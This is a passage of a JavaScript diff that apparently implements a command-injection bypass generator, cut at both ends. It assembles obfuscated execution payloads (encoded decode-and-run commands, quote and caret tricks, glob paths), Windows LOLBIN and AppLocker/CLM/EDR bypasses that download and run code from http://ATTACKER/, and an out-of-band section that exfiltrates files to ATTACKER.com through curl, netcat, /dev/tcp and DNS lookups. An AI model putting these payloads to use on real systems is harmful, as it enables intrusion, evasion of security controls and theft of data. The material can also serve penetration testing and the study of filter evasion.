+    { name: 'printf + Hex', desc: 'Hex-encode command, printf and execute', cmd: `printf '${hex}'|bash`, os: 'linux', needs: ['quote','pipe'] },
+    { name: 'echo -e Hex', desc: 'Echo hex-encoded and execute', cmd: `echo -e '${hex}'|bash`, os: 'linux', needs: ['quote','pipe'] },
+    { name: 'printf + Octal', desc: 'Octal-encode command, printf and execute', cmd: `printf '${oct}'|bash`, os: 'linux', needs: ['quote','pipe'] },
+    { name: 'URL Encoded', desc: 'Full command URL encoded', cmd: url, os: 'both', needs: [] },
+    { name: 'Double URL Encoded', desc: 'Encode twice to bypass single decode filters', cmd: toDoubleURLEncode(fullCmd), os: 'both', needs: [] },
+    { name: 'Python Base64 Exec', desc: 'Use Python to decode and execute', cmd: `python -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"`, os: 'linux', needs: ['quote','parenthesis'] },
+    { name: 'Python3 Base64 Exec', desc: 'Use Python3 to decode and execute (python may be python2 on older systems)', cmd: `python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"`, os: 'linux', needs: ['quote','parenthesis'] },
+    { name: 'Perl Base64 Exec', desc: 'Use Perl to decode and execute', cmd: `perl -e 'use MIME::Base64;system(decode_base64("${b64}"))'`, os: 'linux', needs: ['quote','parenthesis'] },
+    { name: 'PHP Base64 Exec', desc: 'Use PHP to decode and execute', cmd: `php -r "system(base64_decode('${b64}'));"`, os: 'linux', needs: ['quote','parenthesis'] },
+    { name: 'PS: -EncodedCommand', desc: 'PowerShell UTF-16LE Base64 encoded command (bypasses execution policy)', cmd: `powershell -nop -enc ${psB64}`, os: 'windows', needs: [], win: 'ps' },
+    { name: 'PS: -EncodedCommand (Full)', desc: 'Full PowerShell invocation with encoded command', cmd: `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${psB64}`, os: 'windows', needs: [], win: 'ps' },
+    { name: 'PS: UTF8 Base64 Decode', desc: 'Decode standard UTF-8 Base64 in PS (avoids UTF-16LE complexity)', cmd: `iex [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${b64}"))`, os: 'windows', needs: ['dollar','quote','parenthesis'], win: 'ps' },
+    { name: 'CMD: certutil decode', desc: 'Write base64 to file, decode with certutil, execute', cmd: `echo ${b64} > %TEMP%\\b.txt & certutil -decode %TEMP%\\b.txt %TEMP%\\c.bat & %TEMP%\\c.bat`, os: 'windows', needs: ['ampersand','angle','percent'], win: 'cmd' },
+    { name: 'CMD: Random Case', desc: 'Windows CMD is case-insensitive, bypass case-sensitive filters', cmd: randomCase(fullCmd), os: 'windows', needs: [], win: 'cmd' },
+    { name: 'PS: Base64 in Variable', desc: 'Store base64 in PS variable then decode and execute', cmd: `$c=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("${psB64}"));iex $c`, os: 'windows', needs: ['dollar','parenthesis','quote'], win: 'ps' },
+    { name: 'PS: String Format', desc: 'PowerShell string formatting operator bypasses simple keyword filters.', cmd: `iex ("{0}" -f "${fullCmd}")`, os: 'windows', needs: ['quote','parenthesis'], win: 'ps' },
+    { name: 'PS: Char Code Array', desc: 'Build command from ASCII char codes to evade all regex filters.', cmd: `iex (-join @(${fullCmd.split('').map(c => `[char]${c.charCodeAt(0)}`).join(',')}))`, os: 'windows', needs: ['parenthesis'], win: 'ps' },
+    { name: 'PS: Decimal Byte Array', desc: 'Convert string to decimal byte array and decode in PS. Completely evades string matching.', cmd: `iex ([System.Text.Encoding]::ASCII.GetString([byte[]](${fullCmd.split('').map(c => c.charCodeAt(0)).join(',')})))`, os: 'windows', needs: ['parenthesis'], win: 'ps' }
+  );
+  cats.push(encoding);
+
+  // ========== QUOTE & ESCAPE MANIPULATION ==========
+  const quotes = { name: 'Quote & Escape Manipulation', icon: '🗣️', color: 'var(--orange)', techniques: [] };
+  function splitQuotes(word, q) { if (word.length < 2) return word; const mid = Math.floor(word.length / 2); return word.slice(0, mid) + q + q + word.slice(mid); }
+  function backslashSplit(word) { return word.split('').join('\\'); }
+  const argPart = args ? ' ' + args : '';
+  quotes.techniques.push(
+    { name: 'Empty Double Quotes', desc: 'Insert "" inside command name to break pattern match', cmd: splitQuotes(bin, '"') + argPart, os: 'linux', needs: ['quote'] },
+    { name: 'Empty Single Quotes', desc: "Insert '' inside command name", cmd: splitQuotes(bin, "'") + argPart, os: 'linux', needs: ['quote'] },
+    { name: 'Backslash Escape', desc: 'Escape each character with backslash', cmd: backslashSplit(bin) + argPart, os: 'linux', needs: [] },
+    { name: 'Mixed Quotes', desc: 'Mix single and double quotes inside command', cmd: `'${bin[0]}'"${bin.slice(1)}"` + argPart, os: 'linux', needs: ['quote'] },
+    { name: 'Partial Escape', desc: 'Escape only first character', cmd: '\\' + bin + argPart, os: 'linux', needs: [] },
+    { name: 'Double-Quote Wrap', desc: 'Wrap entire command in double quotes', cmd: `"${fullCmd}"`, os: 'both', needs: ['quote'] },
+    { name: 'Single-Quote Wrap', desc: 'Wrap entire command in single quotes', cmd: `'${fullCmd}'`, os: 'both', needs: ['quote'] },
+    { name: '$"..." ANSI-C Quoting', desc: 'ANSI-C quoting style', cmd: `$"${fullCmd}"`, os: 'linux', needs: ['dollar','quote'] },
+    { name: 'CMD: Caret Escape ^', desc: 'Caret escapes special chars in CMD (e.g., ^&, ^|, ^<)', cmd: fullCmd.replace(/([&|<>^])/g, '^$1'), os: 'windows', needs: [], win: 'cmd' },
+    { name: 'CMD: Caret Every Char', desc: 'Escape every character with caret to break filters', cmd: fullCmd.split('').join('^'), os: 'windows', needs: [], win: 'cmd' },
+    { name: 'CMD: Double Quotes', desc: 'Double quotes work in CMD, single quotes do NOT', cmd: `"${fullCmd}"`, os: 'windows', needs: ['quote'], win: 'cmd' },
+    { name: 'CMD: Quote Inside', desc: 'Insert "" inside command to break keyword filters', cmd: splitQuotes(bin, '"') + argPart, os: 'windows', needs: ['quote'], win: 'cmd' },
+    { name: 'PS: Backtick Escape', desc: 'Backtick is PowerShell escape character', cmd: fullCmd.replace(/([&|<>])/g, '`$1'), os: 'windows', needs: ['backtick'], win: 'ps' },
+    { name: 'PS: Single Quotes', desc: 'Single quotes for literal strings in PS', cmd: `'${fullCmd}'`, os: 'windows', needs: ['quote'], win: 'ps' }
+  );
+  cats.push(quotes);
+
+  // ========== WILDCARD & GLOBBING ==========
+  const wildcards = { name: 'Wildcard & Globbing', icon: '🃏', color: 'var(--yellow)', techniques: [] };
+  function toGlob(word) { return word.replace(/[a-z]/g, '?'); }
+  wildcards.techniques.push(
+    { name: '? Single Char Wildcard', desc: 'Replace each character with ? for glob matching', cmd: `/???/${toGlob(bin)} ${args ? args.split(' ').map(a => a.includes('/') ? a.replace(/[a-z]/g,'?') : a).join(' ') : ''}`, os: 'linux', needs: ['slash'] },
+    { name: '* Star Wildcard', desc: 'Use * to match any characters in path', cmd: `/???/*at ${args || ''}`.trim(), os: 'linux', needs: ['slash'] },
+    { name: 'Character Class []', desc: 'Use character classes to match specific chars', cmd: `/[b]in/[c]at ${args || ''}`.trim(), os: 'linux', needs: ['slash'] },
+    { name: 'Glob + Brace', desc: 'Combine glob with brace expansion', cmd: `{/bin,/*/bin}/cat ${args || ''}`.trim(), os: 'linux', needs: ['slash'] },
+    { name: 'CMD: forfiles Wildcard', desc: 'forfiles /m accepts wildcards. CMD itself does NOT expand * or ? in command paths — use forfiles or for /f instead.', cmd: `forfiles /p C:\\Windows\\System32 /m c?d.exe /c "cmd /c ${fullCmd}"`, os: 'windows', needs: ['slash','quote'], win: 'cmd' },
+    { name: 'CMD: forfiles @path Exec', desc: 'forfiles resolves wildcard-matched path via @path, then executes it', cmd: `forfiles /p C:\\Windows\\System32 /m c?d.exe /c "@path /c ${fullCmd}"`, os: 'windows', needs: ['slash','quote'], win: 'cmd' },
+    { name: 'CMD: for /f + dir Wildcard', desc: 'dir DOES expand wildcards; capture the resolved path with for /f and execute. Use %%i in batch files, %i in direct CMD.', cmd: `for /f "delims=" %i in ('dir /b /s C:\\Windows\\System32\\c?d.exe') do %i /c "${fullCmd}"`, os: 'windows', needs: ['slash','quote','parenthesis'], win: 'cmd' },
+    { name: 'CMD: for /f Glob Exec', desc: 'Wildcard-match cmd.exe across directories via dir glob, then execute', cmd: `for /f "delims=" %i in ('dir /b /s C:\\Windows\\*32\\c*d.e*e') do %i /c "${fullCmd}"`, os: 'windows', needs: ['slash','quote','parenthesis'], win: 'cmd' },
+    { name: 'PS: Resolve-Path Wildcard', desc: 'PowerShell Resolve-Path natively supports * and ? wildcards in paths', cmd: `& (Resolve-Path C:\\Windows\\System32\\c?d.exe) /c "${fullCmd}"`, os: 'windows', needs: ['quote','ampersand','parenthesis'], win: 'ps' },
+    { name: 'PS: Get-Command Resolve', desc: 'Resolve cmd.exe via Get-Command with wildcard pattern. No full path needed — bypasses path-based filters.', cmd: `& (Get-Command c?d -Type Application).Source /c "${fullCmd}"`, os: 'windows', needs: ['quote','ampersand','parenthesis'], win: 'ps' },
+    { name: 'PS: Direct Wildcard Path', desc: 'PowerShell call operator supports wildcards if exactly ONE file matches. Use specific patterns to avoid multi-match errors.', cmd: `& C:\\Windows\\System32\\c?d.exe /c "${fullCmd}"`, os: 'windows', needs: ['quote','ampersand'], win: 'ps' }
+  );
+  cats.push(wildcards);
+
+  // ========== VARIABLE & ENVIRONMENT TRICKS ==========
+  const variables = { name: 'Variable & Environment Tricks', icon: '🔤', color: 'var(--pink)', techniques: [] };
+  variables.techniques.push(
+    { name: '${PATH} Slice for /', desc: 'Extract "/" from PATH variable', cmd: `${bin} ${args ? args.replace(/\//g, '${PATH:0:1}') : ''}`, os: 'linux', needs: ['dollar','slash'] },
+    { name: '$0 Shell Reference', desc: 'Use $0 to reference current shell', cmd: `$0 -c "${fullCmd}"`, os: 'linux', needs: ['dollar','quote'] },
+    { name: 'ENV Variable Assignment', desc: 'Set variable then execute', cmd: `a=${bin};$a ${args || ''}`.trim(), os: 'linux', needs: ['dollar','semicolon'] },
+    { name: 'Dynamic Variable Build', desc: 'Build command from multiple variables', cmd: `a=c;b=a;t=t;$a$b$t ${args || ''}`.trim(), os: 'linux', needs: ['dollar','semicolon'] },
+    { name: 'CMD: %COMSPEC%', desc: 'Use COMSPEC env var to invoke cmd.exe', cmd: `%COMSPEC% /c ${fullCmd}`, os: 'windows', needs: ['percent','slash'], win: 'cmd' },
+    { name: 'CMD: %COMSPEC% Hidden', desc: 'Use COMSPEC with hidden window', cmd: `start /b %COMSPEC% /c "${fullCmd}"`, os: 'windows', needs: ['percent','slash','quote'], win: 'cmd' },
+    { name: 'CMD: %TEMP% Write', desc: 'Write to TEMP dir then execute', cmd: `echo ${fullCmd} > %TEMP%\\r.bat & %TEMP%\\r.bat`, os: 'windows', needs: ['percent','angle','ampersand'], win: 'cmd' },
+    { name: 'CMD: Var Substring Build', desc: 'Build command from env var substrings', cmd: `set a=cm&set b=d&%a%%b% /c "${fullCmd}"`, os: 'windows', needs: ['percent','ampersand','quote'], win: 'cmd' },
+    { name: 'CMD: Delayed Expansion', desc: 'Use !VAR! with delayed expansion to bypass filters', cmd: `cmd /v:on /c "set x=${bin}&!x! ${args || ''}"`.trim(), os: 'windows', needs: ['percent','quote'], win: 'cmd' },
+    { name: 'PS: $env:COMSPEC', desc: 'Access COMSPEC via PowerShell', cmd: `& $env:COMSPEC /c "${fullCmd}"`, os: 'windows', needs: ['dollar','quote'], win: 'ps' },
+    { name: 'PS: Env Variable Exec', desc: 'Build and execute from PS env vars', cmd: `$c=$env:COMSPEC;& $c /c "${fullCmd}"`, os: 'windows', needs: ['dollar','quote','ampersand'], win: 'ps' },
+    { name: 'PS: Variable Concat', desc: 'Build command string from variables', cmd: `$a="cmd";$b="/c";& $a $b "${fullCmd}"`, os: 'windows', needs: ['dollar','quote','ampersand'], win: 'ps' }
+  );
+  cats.push(variables);
+
+  // ========== ALTERNATIVE COMMANDS & EXECUTORS ==========
+  const alternatives = { name: 'Alternative Commands & Executors', icon: '🔄', color: 'var(--cyan)', techniques: [] };
+  if (catData.linux_alts.length > 0) { catData.linux_alts.forEach(alt => { let cmdStr = alt; if (alt.includes('FILE')) cmdStr = alt.replace(/FILE/g, fileArg); else if (category === 'file_reader' && !args) cmdStr = `${alt} ${fileArg}`; else if (args && alt.split(' ').length === 1 && !alt.includes('*') && !alt.includes('{')) cmdStr = `${alt} ${args}`; alternatives.techniques.push({ name: alt.split(' ')[0], desc: `Linux ${category.replace('_', ' ')} alternative`, cmd: cmdStr, os: 'linux', needs: [] }); }); }
+  alternatives.techniques.push(
+    { name: 'Python Exec', desc: 'Execute via Python', cmd: `python -c "import os; os.system('${fullCmd}')"`, os: 'linux', needs: ['quote'] },
+    { name: 'Python3 Exec', desc: 'Execute via Python3 (python may be python2 on older systems)', cmd: `python3 -c "import os; os.system('${fullCmd}')"`, os: 'linux', needs: ['quote'] },
+    { name: 'Perl Exec', desc: 'Execute via Perl system()', cmd: `perl -e 'system("${fullCmd}");'`, os: 'linux', needs: ['quote'] },
+    { name: 'Perl exec()', desc: 'Execute via Perl exec() — replaces current process', cmd: `perl -e 'exec "${fullCmd}"'`, os: 'linux', needs: ['quote'] },
+    { name: 'PHP Exec', desc: 'Execute via PHP', cmd: `php -r "system('${fullCmd}');"`, os: 'linux', needs: ['quote'] },
+    { name: 'Ruby Exec', desc: 'Execute via Ruby', cmd: `ruby -e "system('${fullCmd}')"`, os: 'linux', needs: ['quote'] },
+    { name: 'Node Exec', desc: 'Execute via Node.js', cmd: `node -e "require('child_process').execSync('${fullCmd}')"`, os: 'linux', needs: ['quote'] },
+    { name: 'awk system()', desc: 'Execute via awk BEGIN block system() call', cmd: `awk 'BEGIN{system("${fullCmd}")}'`, os: 'linux', needs: ['quote','parenthesis'] },
+    { name: 'GNU sed e', desc: 'GNU sed extension: e command executes shell command. ⚠️ Not available in BSD sed (macOS default).', cmd: `echo|sed 'e ${fullCmd}'`, os: 'linux', needs: ['quote'] },
+    { name: 'eval', desc: 'Execute string as command', cmd: `eval "${fullCmd}"`, os: 'linux', needs: ['quote'] },
+    { name: 'bash -c', desc: 'Execute via bash -c flag', cmd: `bash -c "${fullCmd}"`, os: 'linux', needs: ['quote'] },
+    { name: 'sh -c', desc: 'Execute via sh -c flag', cmd: `sh -c "${fullCmd}"`, os: 'linux', needs: ['quote'] },
+    { name: 'exec', desc: 'Replace shell with command', cmd: `exec ${fullCmd}`, os: 'linux', needs: [] }
+  );
+  if (catData.win_cmd_alts.length > 0) { catData.win_cmd_alts.forEach(alt => { let cmdStr = alt; if (alt.includes('FILE')) cmdStr = alt.replace(/FILE/g, winFileArg); else if (alt.includes('HOST') && args) cmdStr = alt.replace(/HOST/g, args); else if (alt.includes('URL') && args) cmdStr = alt.replace(/URL/g, args); else if (alt.includes('COMMAND') && args) cmdStr = alt.replace(/COMMAND/g, args); alternatives.techniques.push({ name: `CMD: ${alt.split(' ')[0]}`, desc: `Windows CMD ${category.replace('_', ' ')} alternative`, cmd: cmdStr, os: 'windows', needs: [], win: 'cmd' }); }); }
+  if (catData.win_ps_alts.length > 0) { catData.win_ps_alts.forEach(alt => { let cmdStr = alt; if (alt.includes('FILE')) cmdStr = alt.replace(/FILE/g, winFileArg); else if (alt.includes('HOST') && args) cmdStr = alt.replace(/HOST/g, args); else if (alt.includes('URI') && args) cmdStr = alt.replace(/URI/g, args); else if (alt.includes('URL') && args) cmdStr = alt.replace(/URL/g, args); else if (alt.includes('CMD') && args) cmdStr = alt.replace(/CMD/g, args); else if (alt.includes('STR') && args) cmdStr = alt.replace(/STR/g, args); alternatives.techniques.push({ name: `PS: ${alt.split(' ')[0]}`, desc: `PowerShell ${category.replace('_', ' ')} alternative`, cmd: cmdStr, os: 'windows', needs: [], win: 'ps' }); }); }
+  alternatives.techniques.push(
+    { name: 'CMD: cmd /c', desc: 'Execute via cmd.exe /c', cmd: `cmd /c "${fullCmd}"`, os: 'windows', needs: ['quote','slash'], win: 'cmd' },
+    { name: 'CMD: cmd /q /c', desc: 'Quiet mode — disables echo in CMD, then executes', cmd: `cmd /q /c "${fullCmd}"`, os: 'windows', needs: ['quote','slash'], win: 'cmd' },
+    { name: 'CMD: cmd /k', desc: 'Execute and keep window open', cmd: `cmd /k "${fullCmd}"`, os: 'windows', needs: ['quote','slash'], win: 'cmd' },
+    { name: 'CMD: start /b', desc: 'Run command in background. ⚠️ If fullCmd is quoted, first quoted arg becomes window title — prepend empty ""', cmd: `start /b "" ${fullCmd}`, os: 'windows', needs: ['quote'], win: 'cmd' },
+    { name: 'CMD: echo | cmd', desc: 'Pipe command string into a new cmd instance.', cmd: `echo ${fullCmd} | cmd`, os: 'windows', needs: ['pipe'], win: 'cmd' },
+    { name: 'CMD: for /f exec', desc: 'Execute command output via for /f loop. Use %%i in batch, %i in direct CMD.', cmd: `for /f "tokens=*" %i in ('echo ${fullCmd}') do %i`, os: 'windows', needs: ['quote','parenthesis'], win: 'cmd' },
+    { name: 'PS: powershell -c', desc: 'Execute via PowerShell -Command', cmd: `powershell -c "${fullCmd}"`, os: 'windows', needs: ['quote'], win: 'ps' },
+    { name: 'PS: powershell -nop', desc: 'No profile PowerShell execution', cmd: `powershell -nop -c "${fullCmd}"`, os: 'windows', needs: ['quote'], win: 'ps' },
+    { name: 'PS: Invoke-Expression', desc: 'iex executes string as command', cmd: `iex "${fullCmd}"`, os: 'windows', needs: ['quote'], win: 'ps' },
+    { name: 'PS: Call Operator Alias', desc: 'Use & call operator on string', cmd: `& "${fullCmd}"`, os: 'windows', needs: ['quote','ampersand'], win: 'ps' }
+  );
+  cats.push(alternatives);
+
+  // ========== LOLBIN & CLM BYPASSES ==========
+  const lolbin = { name: 'LOLBIN & CLM Bypasses', icon: '🏠', color: 'var(--pink)', techniques: [] };
+  lolbin.techniques.push(
+    { name: 'pcalua (CLM Bypass)', desc: 'Program Compatibility Assistant. Bypasses AppLocker and Constrained Language Mode (CLM).', cmd: `pcalua.exe -a ${fullCmd}`, os: 'windows', needs: [], win: 'cmd' },
+    { name: 'wsl (WSL Bypass)', desc: 'Executes via Windows Subsystem for Linux. Bypasses Windows user-mode hooks/EDR.', cmd: `wsl.exe -e ${fullCmd}`, os: 'windows', needs: [], win: 'cmd' },
+    { name: 'bash (WSL Alias)', desc: 'If WSL is installed, drops into Linux bash to execute.', cmd: `bash.exe -c "${fullCmd}"`, os: 'windows', needs: ['quote'], win: 'cmd' },
+    { name: 'mshta', desc: 'Execute HTML Application host (can run JS/VBS)', cmd: `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""${fullCmd}"",0,True")(window.close)`, os: 'windows', needs: ['quote','parenthesis'], win: 'cmd' },
+    { name: 'rundll32', desc: 'Execute DLL via rundll32 (javascript protocol)', cmd: `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("${fullCmd}")`, os: 'windows', needs: ['quote','parenthesis','percent'], win: 'cmd' },
+    { name: 'regsvr32 (Squiblydoo)', desc: 'Execute script via regsvr32 /s /n /u /i: scrobj.dll', cmd: `regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll`, os: 'windows', needs: ['slash'], win: 'cmd' },
+    { name: 'wmic process', desc: 'Create process via WMIC. Wraps in cmd.exe /c so internal commands (dir, set, etc.) also work.', cmd: `wmic process call create "cmd.exe /c ${fullCmd}"`, os: 'windows', needs: ['quote','slash'], win: 'cmd' },
+    { name: 'wmic OS', desc: 'WMIC OS command execution', cmd: `wmic os get /format:"http://ATTACKER/payload.xsl"`, os: 'windows', needs: ['quote','slash'], win: 'cmd' },
+    { name: 'schtasks', desc: 'Create scheduled task to run command', cmd: `schtasks /create /tn r /tr "${fullCmd}" /sc once /st 00:00 & schtasks /run /tn r`, os: 'windows', needs: ['quote','slash','ampersand'], win: 'cmd' },
+    { name: 'forfiles', desc: 'Execute via forfiles (bypasses some filters)', cmd: `forfiles /p c:\\windows\\system32 /m cmd.exe /c "cmd /c ${fullCmd}"`, os: 'windows', needs: ['quote','slash'], win: 'cmd' },
+    { name: 'cscript/wscript', desc: 'Execute via Windows Script Host', cmd: `cscript //e:jscript script.js`, os: 'windows', needs: ['slash'], win: 'cmd' },
+    { name: 'certutil exec', desc: 'Abuse certutil to decode and run', cmd: `certutil -decode %TEMP%\\enc.b64 %TEMP%\\payload.exe & %TEMP%\\payload.exe`, os: 'windows', needs: ['percent','ampersand','slash'], win: 'cmd' },
+    { name: 'bitsadmin', desc: 'BITS Admin for download/exec', cmd: `bitsadmin /transfer n /download /priority high http://ATTACKER/payload.exe %TEMP%\\p.exe & %TEMP%\\p.exe`, os: 'windows', needs: ['percent','ampersand','slash'], win: 'cmd' },
+    { name: 'ieexec.exe', desc: '.NET IEExec tool — launches .NET apps from URLs. Available on systems with .NET Framework.', cmd: `ieexec.exe http://ATTACKER/payload.exe`, os: 'windows', needs: ['slash'], win: 'cmd' },
+    { name: 'msiexec', desc: 'MSI installer — download and execute MSI packages silently', cmd: `msiexec /i http://ATTACKER/payload.msi /quiet`, os: 'windows', needs: ['slash'], win: 'cmd' },
+    { name: 'scriptrunner.exe', desc: 'App-V ScriptRunner — executes commands via -appvscript. Available on App-V enabled systems.', cmd: `scriptrunner.exe -appvscript ${fullCmd}`, os: 'windows', needs: [], win: 'cmd' },
+    { name: 'PS: Start-Process', desc: 'PowerShell process creation', cmd: `Start-Process -FilePath "cmd.exe" -ArgumentList "/c ${fullCmd}" -WindowStyle Hidden`, os: 'windows', needs: ['quote','parenthesis'], win: 'ps' },
+    { name: 'PS: WMI Process', desc: 'PowerShell WMI process creation', cmd: `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "${fullCmd}"`, os: 'windows', needs: ['quote','parenthesis'], win: 'ps' }
+  );
+  cats.push(lolbin);
+
+  // ========== REVERSE & INDIRECT EXECUTION ==========
+  const reverse = { name: 'Reverse & Indirect Execution', icon: '🔁', color: 'var(--orange)', techniques: [] };
+  const reversedCmd = fullCmd.split('').reverse().join('');
+  reverse.techniques.push(
+    { name: 'rev | bash', desc: 'Reverse the command string, then rev it back and execute', cmd: `echo '${reversedCmd}'|rev|bash`, os: 'linux', needs: ['quote','pipe'] },
+    { name: 'tac Reverse File Read', desc: 'Read file in reverse then reverse output', cmd: `tac ${fileArg}|tac`, os: 'linux', needs: ['pipe'] },
+    { name: 'Process Substitution', desc: 'Use <() process substitution', cmd: `bash <(echo '${fullCmd}')`, os: 'linux', needs: ['angle','parenthesis','quote'] },
+    { name: 'Here-Doc Execution', desc: 'Execute via here-document', cmd: `bash <<EOF\n${fullCmd}\nEOF`, os: 'linux', needs: ['angle'] },
+    { name: 'xargs Execution', desc: 'Pipe to xargs for execution', cmd: `echo '${fullCmd}'|xargs -I{} bash -c '{}'`, os: 'linux', needs: ['quote','pipe'] },
+    { name: 'find -exec', desc: 'Use find -exec to run command', cmd: `find / -maxdepth 0 -exec ${fullCmd} \\;`, os: 'linux', needs: ['slash'] },
+    { name: 'timeout Execution', desc: 'Use timeout as command executor', cmd: `timeout 10 ${fullCmd}`, os: 'linux', needs: [] },
+    { name: 'env Execution', desc: 'Use env to run command', cmd: `env ${fullCmd}`, os: 'linux', needs: [] }
+  );
+  cats.push(reverse);
+
+  // ========== BLIND / TIME-BASED ==========
+  const blind = { name: 'Blind / Time-Based Detection', icon: '⏱️', color: 'var(--yellow)', techniques: [] };
+  blind.techniques.push(
+    { name: 'sleep (Semicolon)', desc: 'Detect injection via time delay', cmd: `true;sleep 5`, os: 'linux', needs: ['semicolon'], blind: true },
+    { name: 'sleep (Pipe)', desc: 'Pipe dummy output to sleep', cmd: `echo|sleep 5`, os: 'linux', needs: ['pipe'], blind: true },
+    { name: 'sleep (AND)', desc: 'AND-chain sleep', cmd: `true&&sleep 5`, os: 'linux', needs: ['ampersand'], blind: true },
+    { name: 'sleep (OR)', desc: 'OR-chain sleep', cmd: `false||sleep 5`, os: 'linux', needs: ['pipe'], blind: true },
+    { name: 'ping -c', desc: 'Delay via ping count', cmd: `true;ping -c 5 127.0.0.1`, os: 'linux', needs: ['semicolon'], blind: true },
+    { name: 'timeout Delay', desc: 'Use timeout for delay detection', cmd: `true;timeout 5 sleep 5`, os: 'linux', needs: ['semicolon'], blind: true },
+    { name: 'CMD: ping -n', desc: 'Windows ping delay (each ping ~1 sec)', cmd: `echo&ping -n 5 127.0.0.1`, os: 'windows', needs: ['ampersand'], blind: true, win: 'cmd' },
+    { name: 'CMD: timeout /t', desc: 'Windows timeout command delay', cmd: `echo&timeout /t 5`, os: 'windows', needs: ['ampersand','slash'], blind: true, win: 'cmd' },
+    { name: 'CMD: choice /t', desc: 'Choice command with timeout', cmd: `echo&choice /t 5 /d y`, os: 'windows', needs: ['ampersand','slash'], blind: true, win: 'cmd' },
+    { name: 'PS: Start-Sleep', desc: 'PowerShell sleep equivalent', cmd: `echo;Start-Sleep -Seconds 5`, os: 'windows', needs: ['semicolon'], blind: true, win: 'ps' },
+    { name: 'PS: ping', desc: 'PowerShell Test-Connection delay', cmd: `echo;Test-Connection -ComputerName 127.0.0.1 -Count 5`, os: 'windows', needs: ['semicolon'], blind: true, win: 'ps' }
+  );
+  cats.push(blind);
+
+  // ========== OOB EXFILTRATION ==========
+  const oob = { name: 'Out-of-Band (OOB) Exfiltration', icon: '📡', color: 'var(--purple)', techniques: [] };
+  oob.techniques.push(
+    { name: 'curl GET', desc: 'Send file contents via HTTP GET to attacker', cmd: `curl http://ATTACKER.com/?d=$(cat ${fileArg}|base64)`, os: 'linux', needs: ['dollar','parenthesis','pipe'], oob: true },
+    { name: 'curl POST', desc: 'Send file via HTTP POST', cmd: `curl -X POST -d @${fileArg} http://ATTACKER.com/`, os: 'linux', needs: [], oob: true },
+    { name: 'wget POST', desc: 'Use wget to exfiltrate', cmd: `wget --post-file=${fileArg} http://ATTACKER.com/`, os: 'linux', needs: [], oob: true },
+    { name: 'nc (netcat)', desc: 'Send file via netcat', cmd: `nc ATTACKER.com 4444 < ${fileArg}`, os: 'linux', needs: ['angle'], oob: true },
+    { name: 'DNS Exfil (dig)', desc: 'Exfiltrate via DNS queries', cmd: `dig $(cat ${fileArg}|base64|tr -d '=').ATTACKER.com`, os: 'linux', needs: ['dollar','parenthesis','pipe'], oob: true },
+    { name: 'bash /dev/tcp', desc: 'Bash built-in TCP redirection', cmd: `cat ${fileArg} > /dev/tcp/ATTACKER/4444`, os: 'linux', needs: ['angle','slash'], oob: true },
+    { name: 'CMD: certutil URL', desc: 'Download from URL using certutil', cmd: `certutil -urlcache -split -f http://ATTACKER.com/payload.exe %TEMP%\\p.exe`, os: 'windows', needs: ['percent','slash'], oob: true, win: 'cmd' },
+    { name: 'CMD: bitsadmin', desc: 'BITS transfer download', cmd: `bitsadmin /transfer myJob /download /priority high http://ATTACKER.com/payload %TEMP%\\p.exe`, os: 'windows', needs: ['percent','slash'], oob: true, win: 'cmd' },
+    { name: 'CMD: nslookup DNS', desc: 'DNS exfiltration via nslookup', cmd: `for /f %i in ('type ${winFileArg}') do nslookup %i.ATTACKER.com`, os: 'windows', needs: ['percent','parenthesis'], oob: true, win: 'cmd' },
+    { name: 'CMD: ping DNS', desc: 'DNS exfil via ping (limited chars)', cmd: `for /f %i in ('type ${winFileArg}') do ping -n 1 %i.ATTACKER.com`, os: 'windows', needs: ['percent','parenthesis'], oob: true, win: 'cmd' },
+    { name: 'CMD: curl.exe (Win10+)', desc: 'Windows 10+ ships curl.exe. Use .exe suffix to avoid PowerShell Invoke-WebRequest alias.', cmd: `curl.exe -X POST -d @${winFileArg} http://ATTACKER.com/`, os: 'windows', needs: [], oob: true, win: 'cmd' },
+    { name: 'PS: Invoke-WebRequest', desc: 'PowerShell HTTP exfil', cmd: `Invoke-WebRequest -Uri http://ATTACKER.com/ -Method POST -Body (Get-Content ${winFileArg})`, os: 'windows', needs: ['parenthesis'], oob: true, win: 'ps' },
+    { name: 'PS: DNS Exfil', desc: 'PowerShell DNS exfiltration', cmd: `$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes("${winFileArg}"));nslookup $d.ATTACKER.com`, os: 'windows', needs: ['dollar','parenthesis','quote'], oob: true, win: 'ps' },
+    { name: 'PS: Net.WebClient', desc: 'Classic .NET WebClient upload', cmd: `(New-Object Net.WebClient).UploadFile("http://ATTACKER.com/","${winFileArg}")`, os: 'windows', needs: ['parenthesis','quote'], oob: true, win: 'ps' },
+    { name: 'PS: Start-BitsTransfer', desc: 'PowerShell BITS transfer', cmd: `Start-BitsTransfer -Source http://ATTACKER.com/payload -Destination $env:TEMP\\p.exe`, os: 'windows', needs: ['dollar'], oob: true, win: 'ps' }
+  );
+  cats.push(oob);
+
+  // ========== NULL BYTE & TERMINATION ==========
+  const nullbyte = { name: 'Null Byte & Termination', icon: '🕳️', color: 'var(--red)', techniques: [] };
+  nullbyte.techniques.push(
+    { name: 'Null Byte %00', desc: 'Truncate string after command (older systems)', cmd: `${fullCmd}%00`, os: 'both', needs: [] },
+    { name: 'Null Byte + Extension', desc: 'Bypass extension checks', cmd: `${fullCmd}%00.jpg`, os: 'both', needs: [] },
+    { name: 'Line Continuation \\', desc: 'Break command across lines', cmd: fullCmd.split(' ').join(' \\\n'), os: 'linux', needs: [] },
+    { name: 'Comment #', desc: 'Comment out trailing characters', cmd: `${fullCmd} #`, os: 'linux', needs: [] },
+    { name: 'CMD: REM Comment', desc: 'Comment out rest of line in CMD', cmd: `${fullCmd} REM`, os: 'windows', needs: [], win: 'cmd' },
+    { name: 'CMD: :: Comment', desc: 'Double-colon comment in CMD (label syntax)', cmd: `${fullCmd} ::`, os: 'windows', needs: [], win: 'cmd' },
